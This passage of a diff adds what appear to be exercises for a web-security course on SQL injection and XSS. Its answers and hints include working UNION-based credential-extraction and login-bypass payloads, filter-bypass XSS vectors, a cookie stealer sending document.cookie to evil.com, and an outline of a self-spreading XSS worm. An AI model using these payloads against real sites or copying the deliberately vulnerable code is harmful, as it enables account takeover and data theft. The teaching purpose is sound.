+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on spot the vulnerable query. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// Product search method\npublic ResultSet search(Connection conn, String userInput) throws SQLException {\n    String sql = \"SELECT * FROM products WHERE name LIKE '%\" + userInput + \"%'\";\n    Statement stmt = conn.createStatement();\n    return stmt.executeQuery(sql);\n}",
+          "expected_output": "Line 2 is vulnerable: the userInput variable is concatenated directly into the SQL string using + operator, allowing an attacker to modify the query logic.",
+          "hints": [
+            {
+              "message": "Look at how userInput is used in the SQL string. Is it treated as data or as part of the command?"
+            },
+            {
+              "message": "The + operator joins userInput directly into the SQL. What if userInput contained SQL keywords like OR or UNION?"
+            },
+            {
+              "message": "Line 2: String concatenation with user input in SQL = SQL Injection. Fix: use PreparedStatement with ? placeholders."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_02",
+          "title": "Exercise 2: Fix the SQL Injection",
+          "description": "Convert this vulnerable search method to use a PreparedStatement. Replace the string concatenation with parameterised queries.",
+          "difficulty": "beginner",
+          "category": "Fix-the-Code",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on fix the sql injection. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// TODO: Fix this method to prevent SQL injection\npublic ResultSet search(Connection conn, String userInput) throws SQLException {\n    // VULNERABLE — change this to PreparedStatement\n    String sql = \"SELECT * FROM products WHERE name LIKE '%\" + userInput + \"%'\";\n    Statement stmt = conn.createStatement();\n    return stmt.executeQuery(sql);\n}",
+          "expected_output": "public ResultSet search(Connection conn, String userInput) throws SQLException {\n    String sql = \"SELECT * FROM products WHERE name LIKE ?\";\n    PreparedStatement pstmt = conn.prepareStatement(sql);\n    pstmt.setString(1, \"%\" + userInput + \"%\");\n    return pstmt.executeQuery();\n}",
+          "hints": [
+            {
+              "message": "Replace Statement with PreparedStatement. Replace the concatenated value with a ? placeholder."
+            },
+            {
+              "message": "Use conn.prepareStatement(sql) instead of conn.createStatement(). Then use pstmt.setString(1, value) to set the parameter."
+            },
+            {
+              "message": "Full fix:\nString sql = \"SELECT * FROM products WHERE name LIKE ?\";\nPreparedStatement pstmt = conn.prepareStatement(sql);\npstmt.setString(1, \"%\" + userInput + \"%\");\nreturn pstmt.executeQuery();"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_03",
+          "title": "Exercise 3: Predict the Output — Normal vs Attack",
+          "description": "Given this SQL: SELECT * FROM products WHERE hidden=0 AND name LIKE '%{input}%'\n\nWhat does the query return when input = headphones? What about input = ' OR '1'='1 ?",
+          "difficulty": "beginner",
+          "category": "Predict-Output",
+          "estimated_minutes": 5,
+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on predict the output — normal vs attack. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// The SQL query template:\n// SELECT * FROM products WHERE hidden=0 AND name LIKE '%{input}%'\n\n// Scenario A: input = \"headphones\"\n// Final SQL: SELECT * FROM products WHERE hidden=0 AND name LIKE '%headphones%'\n// Question: How many products returned? Which ones?\n\n// Scenario B: input = \"' OR '1'='1\"\n// Final SQL: SELECT * FROM products WHERE hidden=0 AND name LIKE '%' OR '1'='1%'\n// Question: How many products returned? Why?",
+          "expected_output": "Scenario A: Returns only products with 'headphones' in the name (probably 1).\nScenario B: Returns ALL products in the database because OR '1'='1' is always true, bypassing the hidden=0 filter. Hidden products are now visible!",
+          "hints": [
+            {
+              "message": "For Scenario A, think about what LIKE '%headphones%' matches. For Scenario B, trace what happens when the ' character breaks out of the string."
+            },
+            {
+              "message": "In Scenario B, the injected ' closes the LIKE string early. Then OR '1'='1' adds a condition that's ALWAYS true. What happens to the hidden=0 check?"
+            },
+            {
+              "message": "A: 1 product (Wireless Headphones). B: ALL 20 products including hidden ones. The OR makes '1'='1' always true, and it takes precedence over the AND hidden=0 because of SQL operator precedence."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_04",
+          "title": "Exercise 4: UNION Injection — Extract User Data",
+          "description": "The products table has 8 columns (id, name, description, price, category, stock, hidden, image_url). Write a UNION-based SQL injection payload to extract usernames and passwords from the users table.",
+          "difficulty": "intermediate",
+          "category": "Guided Challenge",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on union injection — extract user data. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// The vulnerable search query has 8 columns:\n// SELECT * FROM products WHERE name LIKE '%{input}%'\n// Columns: id, name, description, price, category, stock, hidden, image_url\n\n// TODO: Write a UNION SELECT that extracts from the users table\n// The users table has: id, username, password, role, email, full_name, address, phone\n\n// Your payload goes in the search box:\nString payload = \"\"; // Write your injection here",
+          "expected_output": "Payload: ' UNION SELECT id, username, password, role, email, full_name, address, phone FROM users--\n\nThis returns all product rows PLUS all user rows. User data appears in product columns (username in 'name', password in 'description', etc.).",
+          "hints": [
+            {
+              "message": "UNION requires the same number of columns in both SELECT statements. The products query has 8 columns. How many columns does your users SELECT need?"
+            },
+            {
+              "message": "Start with: ' UNION SELECT null,null,null,null,null,null,null,null FROM users-- to test. Then replace nulls with actual column names from the users table."
+            },
+            {
+              "message": "Full payload: ' UNION SELECT id, username, password, role, email, full_name, address, phone FROM users--\nThe -- comments out the rest of the original query. User credentials appear as 'products' in the results."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_05",
+          "title": "Exercise 5: Blind SQL Injection Detection",
+          "description": "Sometimes the application doesn't show query results directly. Write two boolean-based test payloads: one that should return results (TRUE condition) and one that should return nothing (FALSE condition).",
+          "difficulty": "intermediate",
+          "category": "Independent Problem",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on blind sql injection detection. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// Blind SQL injection: the app doesn't show errors but changes behaviour\n// based on whether the injected condition is TRUE or FALSE.\n\n// TODO: Write a TRUE payload (should show search results)\nString truePayload = \"\";\n\n// TODO: Write a FALSE payload (should show NO results)\nString falsePayload = \"\";\n\n// If these behave differently, SQL injection is confirmed!",
+          "expected_output": "TRUE payload: ' OR '1'='1'-- (always true, returns results)\nFALSE payload: ' OR '1'='2'-- (always false, returns nothing)\n\nIf the app shows different behaviour for these two inputs, SQL injection is confirmed even without seeing error messages.",
+          "hints": [
+            {
+              "message": "Think of two conditions: one that's always true and one that's always false. How do you write these in SQL?"
+            },
+            {
+              "message": "TRUE: any condition where both sides are equal (1=1, 'a'='a'). FALSE: any condition where they differ (1=2, 'a'='b'). Append these after ' OR ..."
+            },
+            {
+              "message": "TRUE: ' OR '1'='1'--   FALSE: ' OR '1'='2'--\nDifferent results = SQL injection confirmed."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_06",
+          "title": "Exercise 6: SQLi in Different Contexts",
+          "description": "SQL injection doesn't just happen in search boxes. For each scenario below, write the appropriate injection payload.",
+          "difficulty": "intermediate",
+          "category": "Real-World Scenario",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on sqli in different contexts. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// Scenario 1: Login form\n// SQL: SELECT * FROM users WHERE username='{input}' AND password='{pass}'\n// Goal: Log in as admin without knowing the password\nString loginPayload = \"\"; // username field\n\n// Scenario 2: URL parameter for user profile\n// URL: /profile?id={input}\n// SQL: SELECT * FROM users WHERE id = {input}\n// Goal: See ALL users, not just one\nString profilePayload = \"\"; // id parameter\n\n// Scenario 3: Sort order parameter\n// URL: /products?sort={input}\n// SQL: SELECT * FROM products ORDER BY {input}\n// Goal: Extract database version\nString sortPayload = \"\"; // sort parameter",
+          "expected_output": "1. Login: admin'-- (closes username string, comments out password check)\n2. Profile: 1 OR 1=1 (no quotes needed for numeric field)\n3. Sort: (SELECT version())-- (injects a subquery)",
+          "hints": [
+            {
+              "message": "For login: how can you make the password check disappear? SQL comments (--) ignore everything after them."
+            },
+            {
+              "message": "For numeric fields (id), you don't need quotes. Just append OR 1=1. For ORDER BY, you can inject a subquery."
+            },
+            {
+              "message": "1: admin'--  2: 1 OR 1=1  3: (SELECT version())--\nEach context requires slightly different syntax because of where in the SQL the input appears."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_07",
+          "title": "Exercise 7: Input Validation for SQL — Is It Enough?",
+          "description": "A developer 'fixed' SQL injection by blocking the word 'OR' in search input. Find a bypass and explain why this approach is fundamentally flawed.",
+          "difficulty": "intermediate",
+          "category": "Debugging",
+          "estimated_minutes": 7,
+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on input validation for sql — is it enough?. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// \"Fixed\" search — blocks OR keyword\npublic ResultSet search(Connection conn, String input) throws SQLException {\n    // Security filter\n    if (input.toUpperCase().contains(\"OR\")) {\n        throw new SecurityException(\"Blocked: suspicious input\");\n    }\n    String sql = \"SELECT * FROM products WHERE name LIKE '%\" + input + \"%'\";\n    Statement stmt = conn.createStatement();\n    return stmt.executeQuery(sql);\n}\n\n// TODO: Find a payload that bypasses this filter\n// Hint: Think about SQL keywords other than OR",
+          "expected_output": "Bypasses:\n1. UNION SELECT ... (doesn't contain 'OR')\n2. ' AND '1'='1 (uses AND instead of OR)\n3. 1' || '1'='1 (uses || concatenation operator)\n\nBlocklisting is fundamentally flawed because you can't anticipate every SQL keyword and syntax variation. PreparedStatements are the only real fix.",
+          "hints": [
+            {
+              "message": "The filter only blocks 'OR'. What other SQL keywords could achieve similar results? Think about UNION, AND, or operator alternatives."
+            },
+            {
+              "message": "UNION SELECT doesn't contain 'OR' at all! Also, what about lowercase 'or' vs uppercase 'OR'? Wait — they used toUpperCase(), so case won't help. But UNION still works."
+            },
+            {
+              "message": "Bypasses: UNION SELECT, AND-based injection, || operator. Blocklisting ALWAYS has gaps. The only real fix is parameterisation (PreparedStatement)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_08",
+          "title": "Exercise 8: Multi-Table Data Extraction",
+          "description": "Write a complete SQL injection attack plan that extracts: 1) all table names in the database, 2) column names from the users table, 3) all user records. Use SQLite-specific system tables.",
+          "difficulty": "advanced",
+          "category": "Build-from-Scratch",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on multi-table data extraction. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// SQLite stores schema in sqlite_master table\n// Columns: type, name, tbl_name, rootpage, sql\n\n// Step 1: TODO — Extract all table names\nString step1 = \"\";\n\n// Step 2: TODO — Get column info for users table\n// (Hint: sqlite_master.sql contains CREATE TABLE statements)\nString step2 = \"\";\n\n// Step 3: TODO — Extract all data from users\nString step3 = \"\";",
+          "expected_output": "Step 1: ' UNION SELECT type,name,sql,null,null,null,null,null FROM sqlite_master--\n(Returns all table names and their CREATE TABLE statements)\n\nStep 2: Read the CREATE TABLE users(...) statement from step 1 results to learn column names.\n\nStep 3: ' UNION SELECT id,username,password,role,email,full_name,address,phone FROM users--",
+          "hints": [
+            {
+              "message": "SQLite stores all schema info in the sqlite_master table. Its columns include 'name' (table name) and 'sql' (the CREATE TABLE statement)."
+            },
+            {
+              "message": "Step 1 payload: ' UNION SELECT type,name,sql,null,null,null,null,null FROM sqlite_master-- (pad to 8 columns to match products). The 'sql' column shows you exactly what columns each table has."
+            },
+            {
+              "message": "Full chain: Step 1: ...FROM sqlite_master-- (find tables). Step 2: Read CREATE TABLE from results (find columns). Step 3: ...FROM users-- (extract data). This is systematic database enumeration."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_09",
+          "title": "Exercise 9: SQLi Impact Assessment",
+          "description": "You've confirmed SQL injection in an e-commerce application's search bar. Write a complete CIA impact assessment and calculate the risk severity using the OWASP methodology.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenario",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on sqli impact assessment. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// Vulnerability: SQL Injection in product search\n// Application: E-commerce shop with customer data and payment records\n\n// TODO: Complete the CIA impact assessment\n\n// Confidentiality Impact: ?\n// What data can an attacker READ?\nString confidentiality = \"\";\n\n// Integrity Impact: ?\n// What data can an attacker CHANGE?\nString integrity = \"\";\n\n// Availability Impact: ?\n// Can the attacker DISRUPT the service?\nString availability = \"\";\n\n// Overall Severity: ?\n// Using OWASP: Likelihood (Easy/Medium/Hard) x Impact (Low/Medium/High)\nString severity = \"\";",
+          "expected_output": "Confidentiality: HIGH — Attacker can read all tables: user credentials, emails, addresses, order history, payment data, admin configs.\n\nIntegrity: HIGH — With INSERT/UPDATE injection, attacker can modify prices, create admin accounts, alter order records.\n\nAvailability: MEDIUM — DROP TABLE could destroy data; resource-intensive queries could cause DoS.\n\nSeverity: CRITICAL — Likelihood is HIGH (easy to discover via search bar, no authentication needed) × Impact is HIGH (full database access) = CRITICAL.",
+          "hints": [
+            {
+              "message": "For Confidentiality: think about what's in the database. Users, orders, products, admin data — all accessible via UNION injection."
+            },
+            {
+              "message": "For Integrity: SQL injection isn't just about reading. INSERT, UPDATE, DELETE are also SQL commands. What damage could they do?"
+            },
+            {
+              "message": "CIA: C=HIGH (all data readable), I=HIGH (data modifiable via UPDATE/INSERT), A=MEDIUM (DROP TABLE possible). Severity: CRITICAL because it's easy to find (public search bar), easy to exploit (simple string), and devastating impact."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_10",
+          "title": "Exercise 10: Defence Comparison — Which Fix Is Best?",
+          "description": "Three developers proposed different 'fixes' for SQL injection. Analyse each one: rate it as Effective, Partially Effective, or Ineffective, and explain why.",
+          "difficulty": "advanced",
+          "category": "Code-Trace",
+          "estimated_minutes": 10,
+          "ai_intro": "Let's work on SQL Injection! This exercise focuses on defence comparison — which fix is best?. Take your time — security assessment is detective work. 🔍",
+          "starter_code": "// Developer A: Blocklist approach\npublic ResultSet searchA(Connection conn, String input) throws SQLException {\n    String clean = input.replaceAll(\"(?i)(union|select|drop|insert|update|delete|--|;)\", \"\");\n    String sql = \"SELECT * FROM products WHERE name LIKE '%\" + clean + \"%'\";\n    return conn.createStatement().executeQuery(sql);\n}\n\n// Developer B: Escape single quotes\npublic ResultSet searchB(Connection conn, String input) throws SQLException {\n    String clean = input.replace(\"'\", \"''\");\n    String sql = \"SELECT * FROM products WHERE name LIKE '%\" + clean + \"%'\";\n    return conn.createStatement().executeQuery(sql);\n}\n\n// Developer C: PreparedStatement\npublic ResultSet searchC(Connection conn, String input) throws SQLException {\n    PreparedStatement ps = conn.prepareStatement(\n        \"SELECT * FROM products WHERE name LIKE ?\");\n    ps.setString(1, \"%\" + input + \"%\");\n    return ps.executeQuery();\n}",
+          "expected_output": "A: INEFFECTIVE — Blocklist can be bypassed (encoding tricks, double-writing: SESELECTLECT → SELECT after removal, alternative syntax).\n\nB: PARTIALLY EFFECTIVE — Escaping quotes blocks basic injection but can be bypassed with numeric injection, encoding, or database-specific escape sequences.\n\nC: EFFECTIVE — PreparedStatement separates SQL structure from data at the database driver level. No bypass is possible because user input never becomes part of the SQL command.",
+          "hints": [
+            {
+              "message": "Think about each approach: does it prevent ALL possible SQL injection, or just some patterns?"
+            },
+            {
+              "message": "Developer A: What if someone writes SESELECTLECT? After removing SELECT, it becomes SELECT again. Developer B: What about numeric contexts where quotes aren't needed?"
+            },
+            {
+              "message": "A: Ineffective (bypass: encoding, double-writing, alternative syntax). B: Partially effective (works for string contexts but fragile). C: Effective (PreparedStatement is the gold standard — data and commands are fundamentally separated)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_11",
+          "title": "Exercise 11: Identify the XSS Sink",
+          "description": "Find where user content is rendered without encoding in this product page code.",
+          "difficulty": "beginner",
+          "category": "XSS Prevention",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to tackle XSS! This exercise is about identify the xss sink. XSS is everywhere on the web — let's learn to stop it. 🛡️",
+          "starter_code": "public class ProductServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws IOException {\n        PrintWriter out = resp.getWriter();\n        Connection conn = DatabaseHelper.getConnection();\n        ResultSet reviews = getReviews(conn, productId);\n        while (reviews.next()) {\n            String username = reviews.getString(\"username\");\n            String content = reviews.getString(\"content\");\n            int rating = reviews.getInt(\"rating\");\n            out.printf(\"<strong>%s</strong>\", htmlEncode(username));\n            out.printf(\"<span>Rating: %d/5</span>\", rating);\n            out.printf(\"<p>%s</p>\", content);  // Line 12\n        }\n    }\n}",
+          "expected_output": "Line 12 is the XSS sink. 'username' is properly encoded with htmlEncode(), but 'content' is rendered directly with printf without any encoding. Any HTML or JavaScript in the review content will execute in visitors' browsers.",
+          "hints": [
+            {
+              "message": "Compare how 'username' and 'content' are handled. Is there a difference in how they're output?"
+            },
+            {
+              "message": "Line 10 uses htmlEncode(username) but line 12 uses content directly. What happens if content contains <script> tags?"
+            },
+            {
+              "message": "Line 12: out.printf(\"<p>%s</p>\", content) — no encoding! Fix: out.printf(\"<p>%s</p>\", htmlEncode(content));"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_12",
+          "title": "Exercise 12: Write an XSS Payload",
+          "description": "Write three different XSS payloads: 1) a simple alert, 2) a cookie stealer, 3) a page defacement. Explain what each does.",
+          "difficulty": "beginner",
+          "category": "XSS Prevention",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to tackle XSS! This exercise is about write an xss payload. XSS is everywhere on the web — let's learn to stop it. 🛡️",
+          "starter_code": "// TODO: Write XSS payloads for a product review field\n\n// Payload 1: Simple alert (proof of concept)\nString poc = \"\";\n\n// Payload 2: Cookie stealer (sends session to attacker)\nString stealer = \"\";\n\n// Payload 3: Page defacement (changes page content)\nString deface = \"\";",
+          "expected_output": "1. PoC: <script>alert('XSS')</script>\n2. Stealer: <script>new Image().src='http://evil.com/steal?c='+document.cookie</script>\n3. Deface: <script>document.body.innerHTML='<h1>HACKED</h1>'</script>",
+          "hints": [
+            {
+              "message": "A simple proof-of-concept just needs to execute JavaScript. What's the simplest script tag you can write?"
+            },
+            {
+              "message": "To steal cookies, you need to send document.cookie to an external server. An Image object can make a GET request without visible navigation."
+            },
+            {
+              "message": "1: <script>alert('XSS')</script>  2: <script>new Image().src='http://evil.com/?c='+document.cookie</script>  3: <script>document.body.innerHTML='<h1>HACKED</h1>'</script>"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_13",
+          "title": "Exercise 13: Build the HTML Encoder",
+          "description": "Write a complete htmlEncode method that prevents XSS by converting dangerous characters to HTML entities.",
+          "difficulty": "beginner",
+          "category": "XSS Prevention",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to tackle XSS! This exercise is about build the html encoder. XSS is everywhere on the web — let's learn to stop it. 🛡️",
+          "starter_code": "// TODO: Complete this method\npublic static String htmlEncode(String input) {\n    if (input == null) return \"\";\n    // Replace these characters with their HTML entities:\n    // & → &amp;   (MUST be first!)\n    // < → &lt;\n    // > → &gt;\n    // \" → &quot;\n    // ' → &#39;\n    return input; // Fix this line\n}",
+          "expected_output": "public static String htmlEncode(String input) {\n    if (input == null) return \"\";\n    return input\n        .replace(\"&\", \"&amp;\")\n        .replace(\"<\", \"&lt;\")\n        .replace(\">\", \"&gt;\")\n        .replace(\"\\\"\", \"&quot;\")\n        .replace(\"'\", \"&#39;\");\n}",
+          "hints": [
+            {
+              "message": "Start with & → &amp; first. Why? Because if you do < → &lt; first, then & → &amp;, the &lt; becomes &amp;lt; — double encoding!"
+            },
+            {
+              "message": "Chain .replace() calls: input.replace(\"&\", \"&amp;\").replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\")..."
+            },
+            {
+              "message": "Full solution: return input.replace(\"&\",\"&amp;\").replace(\"<\",\"&lt;\").replace(\">\",\"&gt;\").replace(\"\\\"\",\"&quot;\").replace(\"'\",\"&#39;\");"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_14",
+          "title": "Exercise 14: Reflected vs Stored XSS",
+          "description": "Classify each scenario as Reflected XSS or Stored XSS, and explain which is more dangerous and why.",
+          "difficulty": "intermediate",
+          "category": "XSS Prevention",
+          "estimated_minutes": 7,
+          "ai_intro": "Time to tackle XSS! This exercise is about reflected vs stored xss. XSS is everywhere on the web — let's learn to stop it. 🛡️",
+          "starter_code": "// Scenario A:\n// User searches for: <script>alert(1)</script>\n// Search page shows: \"Results for: <script>alert(1)</script>\"\n// Script runs ONLY for the person who searched\n\n// Scenario B:\n// User posts a product review: <script>alert(1)</script>\n// Review is saved to database\n// Script runs for EVERY person who views the product page\n\n// TODO: Classify each and explain the difference\nString scenarioA = \"\"; // Reflected or Stored?\nString scenarioB = \"\"; // Reflected or Stored?\nString whichIsWorse = \"\"; // Which is more dangerous and why?",
+          "expected_output": "A: REFLECTED XSS — payload comes from the current request (URL/search), only affects the requester, requires victim to click a crafted link.\n\nB: STORED XSS — payload saved in database, affects ALL future visitors automatically, no special link needed.\n\nStored is more dangerous: it's persistent, affects many users, and requires no social engineering per victim.",
+          "hints": [
+            {
+              "message": "Reflected means the payload 'bounces' off the server in the response to a single request. Stored means it persists."
+            },
+            {
+              "message": "Key question: does the payload need to be sent EACH TIME (reflected) or is it saved and served to everyone (stored)?"
+            },
+            {
+              "message": "A: Reflected (one-time, requires crafted link). B: Stored (persistent, affects all visitors). Stored is worse because it scales — one injection, thousands of victims."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_15",
+          "title": "Exercise 15: XSS Context Matters",
+          "description": "XSS payloads differ depending on WHERE in the HTML the injection happens. Write appropriate payloads for each context.",
+          "difficulty": "intermediate",
+          "category": "XSS Prevention",
+          "estimated_minutes": 7,
+          "ai_intro": "Time to tackle XSS! This exercise is about xss context matters. XSS is everywhere on the web — let's learn to stop it. 🛡️",
+          "starter_code": "// Context 1: Inside HTML element content\n// <p>USER_INPUT_HERE</p>\nString htmlContext = \"\";\n\n// Context 2: Inside an HTML attribute\n// <img src=\"USER_INPUT_HERE\">\nString attrContext = \"\";\n\n// Context 3: Inside a JavaScript string\n// <script>var name = \"USER_INPUT_HERE\";</script>\nString jsContext = \"\";\n\n// Context 4: Inside a URL parameter\n// <a href=\"/search?q=USER_INPUT_HERE\">Link</a>\nString urlContext = \"\";",
+          "expected_output": "1. HTML: <script>alert(1)</script>\n2. Attribute: \" onerror=alert(1) x=\"  (breaks out of src, adds event handler)\n3. JavaScript: \";alert(1)//  (closes string, executes code, comments rest)\n4. URL: javascript:alert(1)  (or data:text/html,<script>alert(1)</script>)",
+          "hints": [
+            {
+              "message": "Each context has different 'escape characters'. In HTML it's < >. In attributes it's \". In JS strings it's \" or '. Think about what breaks each context."
+            },
+            {
+              "message": "For attributes: you need to close the \" first, then add an event handler. For JS: close the string \" then add ;alert(1)."
+            },
+            {
+              "message": "HTML: <script>alert(1)</script>. Attr: \" onerror=alert(1) x=\". JS: \";alert(1)//. URL: javascript:alert(1). Each requires breaking out of its specific syntax."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_16",
+          "title": "Exercise 16: Content Security Policy",
+          "description": "A Content Security Policy (CSP) header can prevent XSS even if encoding fails. Write a CSP that blocks inline scripts but allows scripts from your own domain.",
+          "difficulty": "intermediate",
+          "category": "XSS Prevention",
+          "estimated_minutes": 7,
+          "ai_intro": "Time to tackle XSS! This exercise is about content security policy. XSS is everywhere on the web — let's learn to stop it. 🛡️",
+          "starter_code": "// TODO: Write the Content-Security-Policy header value\n// Requirements:\n// - Block ALL inline scripts (<script>alert(1)</script> should NOT work)\n// - Allow scripts loaded from your own domain (e.g., /static/js/app.js)\n// - Block scripts from any other domain\n// - Allow inline CSS (for styling)\n\n// Write the header:\nString csp = \"\"; // Content-Security-Policy value\n\n// How would you set this in a Java servlet?\n// resp.setHeader(\"Content-Security-Policy\", csp);",
+          "expected_output": "CSP: script-src 'self'; style-src 'self' 'unsafe-inline'; default-src 'self';\n\n'self' = only your own domain. No 'unsafe-inline' for script-src means inline <script> tags won't execute even if injected. This is a powerful second line of defence against XSS.",
+          "hints": [
+            {
+              "message": "CSP uses directives like script-src and style-src. The value 'self' means 'same origin only'."
+            },
+            {
+              "message": "script-src 'self' allows /static/js/app.js but blocks <script>alert(1)</script> because inline scripts require 'unsafe-inline'."
+            },
+            {
+              "message": "CSP: \"script-src 'self'; style-src 'self' 'unsafe-inline'; default-src 'self';\"\nThis blocks inline JS (XSS defence), allows your own scripts, allows inline CSS, and defaults everything else to same-origin."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_17",
+          "title": "Exercise 17: XSS Worm Simulation",
+          "description": "In 2005, the Samy worm infected over 1 million MySpace profiles using stored XSS. Design (on paper, not for real!) how a self-propagating XSS worm would work in a product review system.",
+          "difficulty": "advanced",
+          "category": "XSS Prevention",
+          "estimated_minutes": 10,
+          "ai_intro": "Time to tackle XSS! This exercise is about xss worm simulation. XSS is everywhere on the web — let's learn to stop it. 🛡️",
+          "starter_code": "// EDUCATIONAL ANALYSIS ONLY — Do NOT implement this!\n// Design a theoretical XSS worm that:\n// 1. Executes when ANY user views an infected product review\n// 2. Posts a copy of itself as a review on ANOTHER product\n// 3. Changes the victim's profile name to 'XSS Worm Was Here'\n\n// TODO: Describe the attack chain (pseudocode, not real code)\n// Step 1: What triggers the worm?\nString trigger = \"\";\n// Step 2: How does it spread?\nString spread = \"\";\n// Step 3: What's the impact?\nString impact = \"\";",
+          "expected_output": "Attack chain:\n1. TRIGGER: Victim views product with infected review. Script runs automatically.\n2. SPREAD: Script uses XMLHttpRequest/fetch to POST a new review containing itself on a random product. The worm now exists on TWO products.\n3. IMPACT: Each new viewer triggers steps 1-2 again. Exponential spread. Additionally modifies victim's profile via API call.\n\nDefence: Output encoding stops step 1 entirely. CSP stops script execution. Rate limiting on review posts slows propagation.",
+          "hints": [
+            {
+              "message": "A worm needs to: execute (XSS), replicate (post itself somewhere new), and optionally cause damage (modify data)."
+            },
+            {
+              "message": "The key to self-replication: the script needs to submit an HTTP request that creates a new review containing the SAME script on a different product."
+            },
+            {
+              "message": "Chain: 1) Script in review auto-executes. 2) Script calls fetch('/review', {method:'POST', body:...}) posting itself to another product. 3) Exponential spread as each viewer triggers replication. Fix: Output encoding prevents step 1."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_18",
+          "title": "Exercise 18: DOM-Based XSS",
+          "description": "Not all XSS goes through the server. DOM-based XSS happens entirely in the browser. Find the vulnerability in this client-side JavaScript.",
+          "difficulty": "advanced",
+          "category": "XSS Prevention",
+          "estimated_minutes": 10,
+          "ai_intro": "Time to tackle XSS! This exercise is about dom-based xss. XSS is everywhere on the web — let's learn to stop it. 🛡️",
+          "starter_code": "<!-- Product page with client-side search highlight -->\n<script>\n    // Get search term from URL hash\n    var searchTerm = window.location.hash.substring(1);\n    \n    // Highlight the term on the page\n    if (searchTerm) {\n        document.getElementById(\"results\").innerHTML =\n            \"Showing results for: <strong>\" + searchTerm + \"</strong>\";\n    }\n</script>\n\n<!-- TODO: 1. What's vulnerable? 2. Write the attack URL. 3. How to fix? -->\n// Vulnerable line:\n// Attack URL:\n// Fix:",
+          "expected_output": "1. Vulnerable: innerHTML with unsanitised URL hash input\n2. Attack URL: http://shop.com/search#<img src=x onerror=alert(1)>\n3. Fix: Use textContent instead of innerHTML:\n   document.getElementById('results').textContent = 'Showing results for: ' + searchTerm;",
+          "hints": [
+            {
+              "message": "The URL hash (#) is read by JavaScript and put into innerHTML. What if the hash contains HTML?"
+            },
+            {
+              "message": "innerHTML interprets HTML tags. If searchTerm = <img src=x onerror=alert(1)>, the browser creates an image tag that triggers the onerror event."
+            },
+            {
+              "message": "Vuln: innerHTML with user-controlled hash. Attack: ...#<img src=x onerror=alert(1)>. Fix: use textContent (renders as text, never HTML)."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_19",
+          "title": "Exercise 19: XSS Filter Bypass Techniques",
+          "description": "The developer added an XSS filter that removes <script> tags. Write 5 different payloads that bypass this filter using alternative XSS vectors.",
+          "difficulty": "advanced",
+          "category": "XSS Prevention",
+          "estimated_minutes": 10,
+          "ai_intro": "Time to tackle XSS! This exercise is about xss filter bypass techniques. XSS is everywhere on the web — let's learn to stop it. 🛡️",
+          "starter_code": "// The filter:\nString clean = input.replaceAll(\"(?i)<script[^>]*>.*?</script>\", \"\");\n\n// TODO: Write 5 payloads that don't use <script> tags\nString bypass1 = \"\"; // Using event handlers\nString bypass2 = \"\"; // Using img tag\nString bypass3 = \"\"; // Using svg tag\nString bypass4 = \"\"; // Using body tag\nString bypass5 = \"\"; // Using input tag",
+          "expected_output": "1. <div onmouseover=\"alert(1)\">Hover me</div>\n2. <img src=x onerror=alert(1)>\n3. <svg onload=alert(1)>\n4. <body onload=alert(1)>\n5. <input onfocus=alert(1) autofocus>\n\nNone use <script> tags — all use event handlers on HTML elements. This proves blocklisting is futile.",
+          "hints": [
+            {
+              "message": "HTML event handlers like onload, onerror, onmouseover can execute JavaScript without <script> tags."
+            },
+            {
+              "message": "img tags with invalid src trigger onerror events. svg tags support onload. Many elements support onfocus with autofocus."
+            },
+            {
+              "message": "Bypasses: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, <div onmouseover=alert(1)>hover</div>, <input onfocus=alert(1) autofocus>, <body onload=alert(1)>"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_20",
+          "title": "Exercise 20: Full XSS Remediation",
+          "description": "Fix all XSS vulnerabilities in this simplified product page. Apply output encoding, CSP headers, and input validation as defence-in-depth.",
+          "difficulty": "advanced",
+          "category": "XSS Prevention",
+          "estimated_minutes": 10,
+          "ai_intro": "Time to tackle XSS! This exercise is about full xss remediation. XSS is everywhere on the web — let's learn to stop it. 🛡️",
